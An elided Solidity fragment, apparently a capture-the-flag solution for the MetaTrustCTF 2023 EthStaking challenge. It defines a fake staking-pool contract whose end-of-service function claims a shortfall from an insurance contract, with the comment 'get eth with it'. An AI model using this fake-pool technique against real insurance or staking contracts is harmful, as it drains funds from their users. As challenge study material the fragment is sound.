...
import "src/MetaTrustCTF_2023/EthStaking/EthStaking.sol";

contract FakeEthStakingPool {
  enum State {
    Pending,
    FundRaising,
    Validating,
  ...
  constructor(address _operator, address _insurance) {
    ...
    // set them to fulfill the condition of endOperatorService
  ...
  function endOperatorService() external {
    ...
    if (balance > 32 ether) {
      ...
      (bool success, ) = payable(operator).call{value: commission}("");  
      require(success);
    } else {
      uint256 shortfall = 32 ether - balance;
      if (insurance != address(0)) {
        IInsurance(insurance).requestCompensation(shortfall);  // get eth with it
      }
    }
